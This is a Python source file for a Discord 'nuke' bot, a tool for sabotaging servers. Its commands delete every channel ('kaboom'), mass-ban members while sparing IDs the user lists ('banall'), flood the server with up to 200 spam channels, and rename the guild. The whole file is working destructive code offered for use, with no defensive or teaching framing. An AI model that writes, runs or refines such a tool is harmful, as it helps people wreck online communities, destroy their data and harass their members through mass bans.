import discord
import os
import asyncio

# Core
Client = discord.Client()
Token = os.environ.get("Token")
Prefix = os.environ.get("Command_Prefix")
##
MaxSpamChannelCount = 200

loop = asyncio.get_event_loop()

BypassedUserIds = {""} # <- Insert IDs to protect yourself

# Functions

async def kaboomCommand(guild):
    for channel in guild.channels:
        await channel.delete()
    

async def banallCommand(guild):
    async for member in guild.fetch_members(limit=175):
        if not (str(member.id) in BypassedUserIds):
            try:
                await member.ban()
            except:
                print("unable to ban: " + str(member.id))


async def spamCommand(guild, ChannelName):
    channelName = ""

    for x in range(1, len(ChannelName)):
        channelName = channelName + " "  + ChannelName[x]


    try:
        for x in range(0, MaxSpamChannelCount):
            channel = await guild.create_text_channel(channelName)
    except:
        print("Unable to spam more")


def ChangeGuildName(guild, Name):
    name = ""
    for x in range(1, len(Name)):
        name = name + Name[x] + " "

    guild.name = name
    return True

# Events
@Client.event
async def on_ready():
    print("Bot is ready!")

@Client.event
async def on_message(message):
    messageContent = message.content
    if len(messageContent) > 0:
        if messageContent[0] == Prefix:
            guild = message.guild
            AuthorId= message.author.id
            contents = messageContent.lower().split(" ")
            command = contents[0][1:len(contents[0])]

            if command == "kaboom":
                loop.create_task(kaboomCommand(guild))
            elif command == "spamchannels":
                try:
                    loop.create_task(spamCommand(guild, contents))
                except:
                    print("Command didn't work")
            elif command == "servername":
                ChangeGuildName(guild, contents)
            elif command == "banall":
                try:
                    loop.create_task(banallCommand(guild))
                except:
                    print("Command didn't work")




##
loop.run_until_complete(Client.run(Token))
